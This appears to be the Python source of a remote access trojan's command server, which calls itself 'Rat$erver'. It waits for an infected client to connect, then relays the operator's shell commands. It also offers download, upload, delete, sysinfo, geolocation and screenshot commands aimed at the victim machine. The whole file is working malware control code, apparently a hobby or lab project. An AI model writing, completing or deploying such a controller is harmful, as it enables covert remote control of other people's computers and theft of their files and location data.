import socket
import time
import os

os.system('color') #only on windows

socket.setdefaulttimeout(15)

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)

#listener.bind(('192.168.56.1', 80))
#listener.bind(('172.20.16.61', 80))
listener.bind(('127.0.0.1', 80))
listener.listen(1)
print('\nRunning Rat\033[92m$\033[0merver...')
connection, address = listener.accept()
print(f'\033[93m\nNew connection from {address[0]}\n\033[0m')

def clear_screen():
    os.system('cls')

def send_data(output_data):
    size_of_data = str(len(output_data))
    connection.send(bytes(size_of_data,'utf8'))
    time.sleep(1)
    connection.send(output_data)

def recv_data():
    original_size = connection.recv(2048).decode('utf-8')
    original_size = int(original_size)
    data = connection.recv(2048)
    while len(data) != original_size:
        data = data + connection.recv(2048)
    return data

while True:
    cmd = input('Rat\033[1m\033[92m$\033[0mhell: ')
    connection.send(bytes(cmd, 'utf8'))
    if cmd == 'exit':
        connection.close()
        listener.close()
        print('\nClosing Rat\033[92m$\033[0merver...\n')
        break
    elif cmd == 'cls':
        clear_screen()
        continue
    elif cmd[:2] == 'cd':
        result = recv_data().decode('utf8')
        print(result)
        continue
    elif cmd[:8] == 'download':
        file_output = recv_data()
        if file_output == b'not found':
            print('no file')
            continue
        with open(cmd[9:], 'wb') as write_data:
            write_data.write(file_output)
        continue
    elif cmd[:6] == 'upload':
        try:
            with open(cmd[7:], 'rb') as data:
                data_read = data.read()
        except FileNotFoundError:
            print('File not found')
        else:
            send_data(data_read)
        continue
    elif cmd == 'screen':
        print("taking screenshot")
        continue
    elif cmd[:6] == 'delete':
        print(recv_data().decode("utf-8"))
        continue

    elif cmd == 'geo':
        print(recv_data().decode("utf-8"))
        continue
    elif cmd == 'sysinfo':
        print(recv_data().decode("utf-8"))
        continue
    elif cmd == 'help':
        print('\n\t***************************')
        print('\t*                         *')
        print('\t* download <filename>     *')
        print('\t* upload <filename>       *')
        print('\t* screenshot              *')
        print('\t* delete <filename>       *')
        print('\t* cd <path>               *')
        print('\t* exit                    *')
        print('\t* sysinfo                 *')
        print('\t* geo                     *')
        print('\t* all basic OS commands   *')
        print('\t*                         *')
        print('\t* Keijo, Kai & AimoAnnos  *')
        print('\t*                         *')
        print('\t***************************\n')
        continue
    elif cmd == '':
        continue

    output = recv_data().decode('ISO-8859-1')
    print(output)
